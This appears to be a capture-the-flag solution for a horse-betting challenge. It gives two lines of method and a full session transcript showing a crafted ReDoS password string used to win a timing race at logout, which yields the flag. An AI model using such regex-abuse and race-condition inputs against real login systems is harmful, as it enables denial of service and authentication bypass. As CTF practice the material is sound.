@@ -1,0 +1,86 @@
+Earning money: create bet 1 with 1000000000 money and bet 2 with 0 money, then login as admin to declare winner, 50% chance to get $1000000000
+Race condtion: The password validation regex is vulnerable to redos, so we can abuse it to do timing attack
+
+
+================================================================================
+1) Place Bet
+2) Login as Admin
+
+>>> 1
+What horse would you like to bet on? 1
+How much would you like to bet? 1000000000
+
+================================================================================
+1) Place Bet
+2) Login as Admin
+
+>>> 1
+What horse would you like to bet on? 2
+How much would you like to bet? 0
+
+================================================================================
+1) Place Bet
+2) Login as Admin
+
+>>> 2
+Enter admin password (empty to logout): ju5tnEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvErl05E
+Validating...
+Login success!
+Redirecting...
+
+================================================================================
+1) Declare winner
+2) View balance
+3) Buy flag for $100
+4) Logout
+
+>>> 1
+2 is the big winner!
+
+================================================================================
+1) Declare winner
+2) View balance
+3) Buy flag for $100
+4) Logout
+
+>>> 2
+Balance: 1000000000
+
+================================================================================
+1) Declare winner
+2) View balance
+3) Buy flag for $100
+4) Logout
+
+>>> 2
+Balance: 1000000000
+
+================================================================================
+1) Declare winner
+2) View balance
+3) Buy flag for $100
+4) Logout
+
+>>> 3
+Admins aren't allowed to view the flag!
+
+================================================================================
+1) Declare winner
+2) View balance
+3) Buy flag for $100
+4) Logout
+
+>>> 4
+Enter admin password (empty to logout): ju5tnEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEEvEarl05E
+Validating...
+
+================================================================================
+1) Declare winner
+2) View balance
+3) Buy flag for $100
+4) Logout
+
+>>> Login failure!
+Redirecting...
+3
+ictf{regrets_may_be_the_plural_of_regex_but_ive_no_regrets_from_betting_on_a_sure_thing}
